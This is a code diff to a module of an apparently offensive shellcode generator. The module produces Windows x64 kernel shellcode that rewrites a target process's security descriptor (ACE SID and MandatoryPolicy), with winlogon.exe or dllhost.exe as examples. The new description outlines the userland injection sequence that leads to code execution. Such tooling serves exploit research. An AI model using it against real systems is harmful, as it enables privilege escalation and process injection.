@@ -8,26 +8,50 @@ from sickle.common.lib.generic.mparser import argument_check
 
 class Shellcode():
 
-    name = "Windows (x64) Kernel ACE Edit"
-
-    module = "windows/x64/kernel_ace_edit"
-
-    example_run = f"{sys.argv[0]} -p {module} PROCESS=winlogon.exe -f c"
-
-    platform = "Windows"
-
     arch = "x64"
+
+    platform = "windows"
+
+    name = f"Windows ({arch}) Kernel ACE Edit"
+
+    module = f"{platform}/{arch}/kernel_ace_edit"
+
+    example_run = f"{sys.argv[0]} -p {module} PROCESS=dllhost.exe -f c"
 
     ring = 0
 
-    author = ["Morten Schenk", "wetw0rk"]
+    author = ["Morten Schenk",
+              "Matteo Malvica",
+              "wetw0rk"]
 
-    tested_platforms = ["Windows 11", "Windows 10"]
+    tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)",
+                        "Windows 10 (10.0.17763 N/A Build 17763)"]
 
     summary = "Kernel shellcode to modify the _SECURITY_DESCRIPTOR of a process"
 
-    description = """
-    TODO
+    description = f"""
+    This stub modifies the Ace[0] entry of a given processes _SECURITY_DESCRIPTOR,
+    specifically the SID entry. Upon completion it will modify the MandatoryPolicy
+    to allow us to later inject into a target process when returning to userland.
+
+    To use this shellcode properly you will need to handle injection from userland,
+    first generate the shellcode:
+
+        {example_run}
+
+    Once shellcode is inserted into exploit, ensure that you have code similar to
+    the following pseudo code:
+
+        shellcode = <code to be injected>
+
+        OpenProcess()
+          VirtualAllocEx()
+            WriteProcessMemory()
+              CreateRemoteThread()
+
+    If everything went well, you should have successfully obtained code execution.
+
+    WARNING: ASSUME KERNEL SHELLCODE DOES NOT HANDLE RETURN TO USERLAND!!
     """
 
     arguments = {}
@@ -35,8 +59,6 @@ class Shellcode():
     arguments["PROCESS"] = {}
     arguments["PROCESS"]["optional"] = "yes"
     arguments["PROCESS"]["description"] = "Target process to modify"
-
-    tested_platforms = ["Windows 11"]
 
     def __init__(self, arg_object):
 
@@ -46,6 +68,8 @@ class Shellcode():
         return
 
     def generate_check_stub(self):
+        """Generates the stub responsible for identifying the process we'll be modifying
+        """
 
         argv_dict = argument_check(Shellcode.arguments, self.arg_list)
         if (argv_dict == {}):
@@ -107,6 +131,8 @@ class Shellcode():
         return src
 
     def generate_ace_read_stub(self):
+        """Generates the stub responsible for modifying the ACE entry.
+        """
 
         sizeOf_ACL        = 0x08
         sizeOf_AceType    = 0x01
@@ -150,6 +176,9 @@ found:
         return src
 
     def generate_source(self):
+        """Generates source code to be assembled by the keystone engine
+        """
+
         shellcode = """
 start:
     xor rax, rax
@@ -178,9 +207,7 @@ exit:
         return shellcode
 
     def get_shellcode(self):
+        """Returns ACE Edit Shellcode
+        """
 
         return self.builder.get_bytes_from_asm(self.generate_source())
-
-def generate():
-
-    return Shellcode().get_shellcode()
